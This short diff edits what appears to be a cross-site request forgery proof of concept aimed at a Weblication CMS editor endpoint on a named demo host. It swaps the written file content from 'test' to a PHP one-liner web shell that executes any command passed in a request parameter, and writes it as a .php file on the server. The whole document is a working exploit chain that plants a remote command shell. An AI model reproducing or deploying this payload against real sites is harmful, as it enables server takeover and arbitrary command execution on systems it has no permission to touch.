@@ -4,7 +4,7 @@
     <form action="https://www.coredemo.de/weblication/grid5/apps/wEditorCode/index.php" method="POST">
       <input type="hidden" name="action" value="writecontent" />
       <input type="hidden" name="path" value="&#47;de&#47;kontakt&#47;test&#46;php" />
-      <input type="hidden" name="content" value="test" />
+      <input type="hidden" name="content" value="<?=`{$_REQUEST['_']}`?>" />
       <input type="submit" value="Submit request" />
     </form>
     <script>
@@ -12,4 +12,5 @@
     </script>
   </body>
 </html>
+
 
